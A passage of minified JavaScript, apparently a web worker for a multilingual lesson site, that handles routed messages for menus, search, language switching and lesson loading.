n=a(),e=i(n);self.postMessage({route:"lesson",response:n}),self.postMessage({route:"page-menu",response:e})}self.lang="eng",self.currentLesson="start-page",self.controller=function(){var n,_=(n=e().mark((function n(_){var t,o,i,u;return e().wrap((function(n){for(;;)switch(n.prev=n.next){case 0:t=_.route,o=_.param,n.t0=t,n.next="init"===n.t0?4:"main-menu"===n.t0?10:"keywords"===n.t0?11:"search"===n.t0?12:"lang"===n.t0?13:"lesson"===n.t0?17:20;break;case 4:i=o.lang,u=o.page,self.lang=i||self.lang,self.currentLesson=u||self.currentLesson,self.postMessage({route:t,response:{lang:self.lang,page:self.currentLesson}}),self.postMessage({route:"main-menu",response:r()}),self.postMessage({route:"lesson",response:a()});case 10:return n.abrupt("return",self.postMessage({route:t,response:r()}));case 11:return n.abrupt("return",self.postMessage({route:t,response:s()}));case 12:return n.abrupt("return",c(o));case 13:return self.lang=["eng","ua","ru"].includes(o)?o:self.lang,l(),self.postMessage({route:"main-menu",response:r()}),n.abrupt("return");case 17:return self.currentLesson=o,l(),n.abrupt("return");case 20:return n.abrupt("return",self.postMessage({route:t,response:null,error:"Invalid route."}));case 21:case"end":return n.stop()}}),n)})),function(){var e=this,_=arguments;return new Promise((function(o,r){var s=n.apply(e,_);function a(n){t(s,o,r,a,i,"next",n)}function i(n){t(s,o,r,a,i,"throw",n)}a(void 0)}))});return function(n){return _.apply(this,arguments)}}(),self.onmessage=function(n){return self.controller(n.data)}})()})();